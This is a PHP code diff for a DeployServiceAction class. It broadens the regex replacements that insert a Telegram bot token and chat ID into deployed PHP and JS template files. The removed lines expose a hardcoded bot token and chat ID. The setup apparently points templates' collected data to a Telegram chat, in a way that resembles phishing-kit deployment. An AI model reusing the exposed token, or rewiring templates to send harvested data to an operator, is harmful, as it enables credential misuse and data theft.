@@ -179,19 +179,28 @@ class DeployServiceAction
                         $originalContent = $content;
                         
                         if ($telegramToken) {
-                            // Replace template default token
-                            $content = str_replace('8469317138:AAEs6T2X0qbmkgosM69kAYEnyMWrCqnL-_8', $telegramToken, $content);
+                            // 1. Replace any raw token matching Telegram Bot Token pattern (preserving optional "bot" prefix)
+                            $content = preg_replace('/(bot)?([0-9]{8,11}:[a-zA-Z0-9_-]{35})/i', '${1}' . $telegramToken, $content);
                             
-                            // Replace JS properties e.g., BOT_TOKEN: '...' (supporting quoted keys and using isolated backreferences to prevent digit collisions)
-                            $content = preg_replace('/(["\']?)(BOT_TOKEN|bot_token|token|TOKEN)\1\s*:\s*([\'"])(.*?)\3/i', '${1}${2}${1}: ${3}' . $telegramToken . '${3}', $content);
+                            // 2. Replace JS properties e.g., token: '...' or BOT_TOKEN: '...' (preserving optional "bot" prefix if it existed in the template value)
+                            $content = preg_replace_callback('/(["\']?)(BOT_TOKEN|bot_token|token|TOKEN|id_bot|token_bot|botID|telegramToken|idBot|tokenBot)\1\s*:\s*([\'"])(.*?)\3/i', function($m) use ($telegramToken) {
+                                $prefix = (stripos($m[4], 'bot') === 0) ? 'bot' : '';
+                                return $m[1] . $m[2] . $m[1] . ': ' . $m[3] . $prefix . $telegramToken . $m[3];
+                            }, $content);
+
+                            // 3. Replace PHP/JS variable assignments e.g., $token = '...' or let token = "..." (preserving optional "bot" prefix if it existed in the template value)
+                            $content = preg_replace_callback('/(\$?)(BOT_TOKEN|bot_token|token|TOKEN|id_bot|token_bot|botID|telegramToken|idBot|tokenBot)\b\s*=\s*(["\'])(.*?)\3/i', function($m) use ($telegramToken) {
+                                $prefix = (stripos($m[4], 'bot') === 0) ? 'bot' : '';
+                                return $m[1] . $m[2] . ' = ' . $m[3] . $prefix . $telegramToken . $m[3];
+                            }, $content);
                         }
                         
                         if ($telegramChatId) {
-                            // Replace template default chat ID
-                            $content = str_replace('7672477647', $telegramChatId, $content);
-                            
-                            // Replace JS properties e.g., CHAT_ID: '...' (supporting quoted keys and using isolated backreferences to prevent digit collisions)
-                            $content = preg_replace('/(["\']?)(CHAT_ID|chat_id|id_chat|idChat|chatId|chatId)\1\s*:\s*([\'"])(.*?)\3/i', '${1}${2}${1}: ${3}' . $telegramChatId . '${3}', $content);
+                            // 1. Replace JS properties e.g., chat_id: '...' or CHAT_ID: '...'
+                            $content = preg_replace('/(["\']?)(CHAT_ID|chat_id|id_chat|idChat|chatId|chatid|telegram_id|telegramId|telegramChatId|telegram_chat_id|service_chat)\1\s*:\s*([\'"])(.*?)\3/i', '${1}${2}${1}: ${3}' . $telegramChatId . '${3}', $content);
+
+                            // 2. Replace PHP/JS variable assignments e.g., $chatid = '...' or let chat_id = "..."
+                            $content = preg_replace('/(\$?)(CHAT_ID|chat_id|id_chat|idChat|chatId|chatid|telegram_id|telegramId|telegramChatId|telegram_chat_id|service_chat)\b\s*=\s*(["\'])(.*?)\3/i', '${1}${2} = ${3}' . $telegramChatId . '${3}', $content);
                         }
                         
                         if ($content !== $originalContent) {
